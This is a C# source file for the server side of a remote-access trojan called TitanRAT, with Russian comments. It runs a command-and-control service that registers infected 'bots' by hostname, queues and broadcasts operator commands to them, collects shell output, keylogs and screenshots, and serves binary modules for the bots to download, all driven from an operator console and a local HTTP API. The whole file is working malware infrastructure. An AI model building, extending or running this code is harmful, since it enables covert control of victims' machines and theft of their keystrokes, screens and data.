// Server/Program.cs
using TitanRAT.Server;
using System.Net;
using System.Net.Sockets;
using System.Collections.Concurrent;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

class Program
{
    // Реассемблер сообщений (чанки + потоковая агрегация)
    private static readonly MessageReassembler _reassembler = new();
    
    // Сессии клиентов
    private static readonly ConcurrentDictionary<string, ClientSession> _clients = new();
    
    // Флаги и настройки
    private static volatile bool _running = true;
    private const int TcpPort = 12345;
    private const int HttpPort = 12346;
    private static readonly CancellationTokenSource _httpCts = new();
    
    static async Task Main(string[] args)
    {
        Console.WriteLine($"[C2] Starting TCP server on port {TcpPort}...");
        Console.WriteLine($"[C2] Starting HTTP API on port {HttpPort}...");
        
        // Запуск TCP-слушателя
        var tcpListener = new TcpListener(IPAddress.Any, TcpPort);
        tcpListener.Start();
        var tcpTask = Task.Run(() => AcceptTcpClientsAsync(tcpListener));
        
        // Запуск HTTP API
        var httpTask = Task.Run(() => RunHttpApiAsync(_httpCts.Token));
        
        // Консоль оператора
        await HandleConsoleInputAsync();
        
        // Корректное завершение
        _running = false;
        _httpCts.Cancel();
        tcpListener.Stop();
        foreach (var session in _clients.Values) session.Close();
        await Task.WhenAll(tcpTask, httpTask);
    }
    
    private static async Task AcceptTcpClientsAsync(TcpListener listener)
    {
        while (_running)
        {
            try
            {
                var client = await listener.AcceptTcpClientAsync();
                _ = Task.Run(() => HandleClientAsync(client));
            }
            catch when (_running) { }
        }
    }
    
    private static async Task HandleClientAsync(TcpClient client)
    {
        var session = new ClientSession(Guid.NewGuid().ToString(), client);
        string? line;
        
        try
        {
            // Рукопожатие: HELLO
            line = await session.ReadLineAsync();
            if (line != "HELLO") { session.Close(); return; }
            await session.SendCommandAsync("ACK");
            
            // Регистрация: REGISTER:hostname
            line = await session.ReadLineAsync();
            if (line?.StartsWith("REGISTER:") != true) { session.Close(); return; }
            
            session.Hostname = line["REGISTER:".Length..];
            _clients[session.Id] = session;
            Console.WriteLine($"[+] Bot connected: {session.Hostname} ({session.Id})");
            
            await session.SendCommandAsync($"ID:{session.Id}");
            
            // Главный цикл обработки
            while (_running)
            {
                line = await session.ReadLineAsync();
                if (line == null) break;

                // Игнорируем пустые строки
                if (string.IsNullOrWhiteSpace(line)) continue; 
                
                session.LastSeen = DateTime.UtcNow;

                // Обработка хартбитов (pong / BEAT:id) — "тихо", без вывода в консоль
                if (line.StartsWith("BEAT:") || line == "pong")
                {
                    var cmd = session.GetPendingCommand();
                    if (cmd != null)
                    {
                        Console.WriteLine($"[>] Sending queued command to {session.Id}: {cmd}");
                        await session.SendCommandAsync(cmd);
                    }
                    // Если команд нет — просто игнорируем хартбит
                }
                else
                {
                    // Сохраняем ответ в историю сессии
                    session.AddResponse(line);
                    
                    // Пропускаем через реассемблер (чанки + потоковая агрегация)
                    var assembled = _reassembler.Process(session.Id, line);
                    
                    if (assembled != null)
                    {
                        // Убираем технический префикс для чистого терминального вывода
                        string displayMsg = assembled;
                        if (displayMsg.StartsWith("SHELL_OUT:"))
                            displayMsg = displayMsg.Substring(10); // Remove "SHELL_OUT:"
                            
                        Console.WriteLine($"[RESPONSE] {session.Id}: {displayMsg}");
                    }
                    
                    // Если пришло сообщение НЕ от шелла — сбрасываем буфер шелла (если он "завис")
                    // Это нужно, если оператор переключился на другую команду, а шелл ещё не закончил
                    if (!line.StartsWith("SHELL_OUT") && !line.StartsWith("KEYLOG") && !line.StartsWith("SCREENSHOT"))
                    {
                        var flushed = _reassembler.FlushStream(session.Id, "SHELL_OUT");
                        if (flushed != null && flushed.StartsWith("SHELL_OUT:"))
                        {
                            Console.WriteLine($"[RESPONSE] {session.Id}: {flushed.Substring(10)}");
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Error handling {session.Id}: {ex.Message}");
        }
        finally
        {
            _clients.TryRemove(session.Id, out _);
            session.Close();
            Console.WriteLine($"[-] Bot disconnected: {session.Hostname}");
        }
    }
    
    private static async Task RunHttpApiAsync(CancellationToken token)
    {
        var listener = new HttpListener();
    
        listener.Prefixes.Add($"http://localhost:{HttpPort}/");
        listener.Prefixes.Add($"http://127.0.0.1:{HttpPort}/");
    
        listener.Start();
    
        try
        {
            while (!token.IsCancellationRequested)
            {
                var context = await listener.GetContextAsync().WaitAsync(token);
                _ = Task.Run(() => HandleHttpRequestAsync(context), token);
            }
        }
        catch (OperationCanceledException) { }
        finally
        {
            listener.Stop();
        }
    }
    
    private static async Task HandleHttpRequestAsync(HttpListenerContext context)
    {
        var request = context.Request;
        var response = context.Response;
        
        try
        {
            var path = request.Url?.AbsolutePath ?? "/";
            var method = request.HttpMethod.ToUpper();
            
            if (method == "GET" && path == "/clients")
            {
                var clients = _clients.Values.Select(c => new {
                    id = c.Id,
                    hostname = c.Hostname,
                    lastSeen = c.LastSeen.ToString("o"),
                    queueSize = c.QueueSize
                }).ToArray();
                await SendJsonAsync(response, clients);
            }
            else if (method == "POST" && path == "/send")
            {
                using var reader = new StreamReader(request.InputStream, request.ContentEncoding);
                var body = await reader.ReadToEndAsync();
                var payload = JsonSerializer.Deserialize<SendPayload>(body);
                
                if (payload != null && _clients.TryGetValue(payload.BotId, out var session))
                {
                    session.EnqueueCommand(payload.Command);
                    await SendJsonAsync(response, new { success = true, message = "Command queued" });
                }
                else
                {
                    response.StatusCode = 404;
                    await SendJsonAsync(response, new { error = "Bot not found" });
                }
            }
            else if (method == "GET" && path.StartsWith("/results/"))
            {
                var botId = path["/results/".Length..];
                if (_clients.TryGetValue(botId, out var session))
                {
                    var results = session.GetRecentResponses(20).ToArray();
                    await SendJsonAsync(response, new { bot_id = botId, results });
                }
                else
                {
                    response.StatusCode = 404;
                    await SendJsonAsync(response, new { error = "Bot not found" });
                }
            }
            else if (method == "GET" && path.StartsWith("/modules/") && path.EndsWith(".bin"))
            {
                var moduleName = path["/modules/".Length..];
                var modulePath = Path.Combine("modules", moduleName);
                
                if (File.Exists(modulePath))
                {
                    var fileBytes = await File.ReadAllBytesAsync(modulePath);
                    response.ContentType = "application/octet-stream";
                    response.ContentLength64 = fileBytes.Length;
                    await response.OutputStream.WriteAsync(fileBytes, 0, fileBytes.Length);
                }
                else
                {
                    response.StatusCode = 404;
                    await SendJsonAsync(response, new { error = "Module not found" });
                }
            }
            else
            {
                response.StatusCode = 404;
                await SendJsonAsync(response, new { error = "Not found" });
            }
        }
        catch (Exception ex)
        {
            response.StatusCode = 500;
            await SendJsonAsync(response, new { error = ex.Message });
        }
        finally
        {
            response.Close();
        }
    }
    
    private static async Task SendJsonAsync(HttpListenerResponse response, object data)
    {
        var json = JsonSerializer.Serialize(data);
        var bytes = Encoding.UTF8.GetBytes(json);
        response.ContentType = "application/json";
        response.ContentLength64 = bytes.Length;
        await response.OutputStream.WriteAsync(bytes, 0, bytes.Length);
    }
    
    private static async Task HandleConsoleInputAsync()
    {
        while (_running)
        {
            var input = Console.ReadLine();
            if (string.IsNullOrWhiteSpace(input)) continue;
            
            var parts = input.Split(' ', 3);
            var cmd = parts[0].ToLower();
            
            switch (cmd)
            {
                case "list":
                    Console.WriteLine("\n[Connected Bots]");
                    Console.WriteLine($"{"ID",-36} {"Hostname",-20} {"Last Seen"} {"Queue"}");
                    Console.WriteLine(new string('-', 75));
                    foreach (var c in _clients.Values)
                        Console.WriteLine($"{c.Id,-36} {c.Hostname,-20} {c.LastSeen:HH:mm:ss} {c.QueueSize}");
                    Console.WriteLine();
                    break;
                    
                case "send":
                    if (parts.Length < 3) { Console.WriteLine("Usage: send <id> <command>"); break; }
                    if (_clients.TryGetValue(parts[1], out var target))
                    {
                        target.EnqueueCommand(parts[2]);
                        Console.WriteLine($"[>] Command queued for {parts[1]}: {parts[2]}");
                    }
                    else
                    {
                        Console.WriteLine($"[!] Bot {parts[1]} not found");
                    }
                    break;
                    
                case "queue":
                    if (parts.Length < 2) { Console.WriteLine("Usage: queue <id>"); break; }
                    if (_clients.TryGetValue(parts[1], out var qSession))
                    {
                        Console.WriteLine($"\n[Queue for {parts[1]}] (size: {qSession.QueueSize})");
                        Console.WriteLine("(Commands are delivered on next heartbeat)");
                    }
                    else
                    {
                        Console.WriteLine($"[!] Bot {parts[1]} not found");
                    }
                    break;
                    
                case "clear_queue":
                    if (parts.Length < 2) { Console.WriteLine("Usage: clear_queue <id>"); break; }
                    if (_clients.TryGetValue(parts[1], out var cSession))
                    {
                        cSession.ClearQueue();
                        Console.WriteLine($"[>] Queue cleared for {parts[1]}");
                    }
                    else
                    {
                        Console.WriteLine($"[!] Bot {parts[1]} not found");
                    }
                    break;
                    
                case "broadcast":
                    if (parts.Length < 2) { Console.WriteLine("Usage: broadcast <command>"); break; }
                    foreach (var c in _clients.Values)
                        c.EnqueueCommand(parts[1]);
                    Console.WriteLine($"[>] Command broadcast to {_clients.Count} bots");
                    break;
                    
                case "quit":
                    Console.WriteLine("[*] Shutting down...");
                    _running = false;
                    break;
                    
                default:
                    Console.WriteLine($"[!] Unknown command: {cmd}");
                    break;
            }
        }
    }
}

// Helper class for JSON deserialization
class SendPayload
{
    [JsonPropertyName("bot_id")]
    public string BotId { get; set; } = "";
    
    [JsonPropertyName("command")]
    public string Command { get; set; } = "";
}